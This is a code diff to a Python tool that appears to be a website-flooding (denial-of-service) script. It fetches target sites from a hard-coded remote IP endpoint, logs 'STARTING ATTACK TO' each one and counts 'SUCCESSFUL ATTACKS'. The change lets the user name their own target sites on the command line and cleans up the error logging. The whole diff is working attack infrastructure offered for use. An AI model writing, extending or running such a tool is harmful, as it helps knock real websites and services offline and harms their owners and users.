@@ -10,12 +10,10 @@ from random import choice
 from time import sleep
 from urllib3 import disable_warnings
 from pyuseragents import random as random_useragent
-from json import loads
 from argparse import ArgumentParser
 import platform
 
 import json
-import sys
 
 VERSION = 6
 HOSTS = ["http://46.4.63.238/api.php"]
@@ -33,18 +31,20 @@ def clear():
 logger.remove()
 logger.add(
     stderr,
-    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>",
+    format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> "
+    "| <cyan>{line}</cyan> - <white>{message}</white>",
 )
-threads = int(sys.argv[1])
 
 parser = ArgumentParser()
+parser.add_argument("n_threads", type=int)
+parser.add_argument("target_sites", nargs="*")
 parser.add_argument("-v", "--verbose", dest="verbose", action="store_true")
 parser.add_argument("-n", "--no-clear", dest="no_clear", action="store_true")
-parser.set_defaults(verbose=False)
-parser.set_defaults(no_clear=False)
-args, unknown = parser.parse_known_args()
+args = parser.parse_args()
+threads = int(args.n_threads)
 verbose = args.verbose
 no_clear = args.no_clear
+specified_target_sites = args.target_sites
 
 
 def checkReq():
@@ -122,16 +122,19 @@ def mainth():
                 logger.info("Host {} has invalid format".format(host))
                 sleep(5)
                 continue
-            except Exception:
-                logger.exception("Unexpected error. Host {}".format(host))
+            except Exception as exc:
+                logger.exception(f"Unexpected error: {exc}. Host {host}")
                 sleep(5)
                 continue
         else:
             sleep(5)
             continue
-        logger.info("STARTING ATTACK TO " + data["site"]["page"])
-        site = unquote(data["site"]["page"])
-        if site.startswith("http") == False:
+        if specified_target_sites:
+            site = choice(specified_target_sites)
+        else:
+            site = unquote(data["site"]["page"])
+        logger.info("STARTING ATTACK TO " + site)
+        if not site.startswith("http"):
             site = "https://" + site
 
         attacks_number = 0
@@ -174,8 +177,10 @@ def mainth():
                         print(".", end="")
             if attacks_number > 0:
                 logger.info("SUCCESSFUL ATTACKS: " + str(attacks_number))
-        except:
-            logger.warning("issue happened, SUCCESSFUL ATTACKS: " + str(attacks_number))
+        except Exception as exc:
+            logger.warning(
+                f"issue happened ({exc}), SUCCESSFUL ATTACKS: {attacks_number}"
+            )
             continue
 
 
